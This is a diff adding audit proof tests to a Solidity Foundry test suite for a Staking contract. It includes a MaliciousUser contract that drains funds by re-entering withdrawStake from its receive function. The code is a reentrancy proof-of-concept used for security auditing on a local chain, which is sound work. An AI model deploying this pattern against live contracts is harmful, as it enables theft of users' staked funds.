@@ -473,4 +473,58 @@ contract StakingTest is Test {
         assertEq(v.evidenceIpfsHash.length, 0);
         assertEq(v.feedbackIpfsHash.length, 0);
     }
+
+    /*//////////////////////////////////////////////////////////////
+                           AUDIT PROOF TESTS
+    //////////////////////////////////////////////////////////////*/
+
+    function testVerifierCanDrainTheProtocolByReenterWithdrawStakeFunction()
+        external
+    {
+        vm.startPrank(USER);
+        staking.stake{value: 2 * MIN_ETH_AMOUNT}();
+        vm.stopPrank();
+
+        MaliciousUser attacker = new MaliciousUser(staking);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, MIN_ETH_AMOUNT);
+
+        uint256 balanceBefore = address(staking).balance;
+        uint256 balanceBeforeAttacker = address(attacker).balance;
+        console.log("Balance before attack: ", balanceBefore);
+        console.log("Attacker balance before attack: ", balanceBeforeAttacker);
+
+        vm.expectRevert();
+        vm.startPrank(attackUser);
+        attacker.hack{value: MIN_ETH_AMOUNT}();
+        vm.stopPrank();
+
+        uint256 balanceAfter = address(staking).balance;
+        uint256 balanceAfterAttacker = address(attacker).balance;
+        console.log("Balance after attack: ", balanceAfter);
+        console.log("Attacker balance after attack: ", balanceAfterAttacker);
+    }
+}
+
+contract MaliciousUser {
+    using PriceConverter for uint256;
+
+    Staking staking;
+    // Only works on anvil local chain, since we know the price is 2000 USD per ETH
+    uint256 MIN_ETH_AMOUNT = 1e16;
+
+    constructor(Staking _stakingContract) {
+        staking = _stakingContract;
+    }
+
+    function hack() external payable {
+        staking.stake{value: MIN_ETH_AMOUNT}();
+        staking.withdrawStake(MIN_ETH_AMOUNT);
+    }
+
+    receive() external payable {
+        if (address(staking).balance >= MIN_ETH_AMOUNT) {
+            staking.withdrawStake(MIN_ETH_AMOUNT);
+        }
+    }
 }
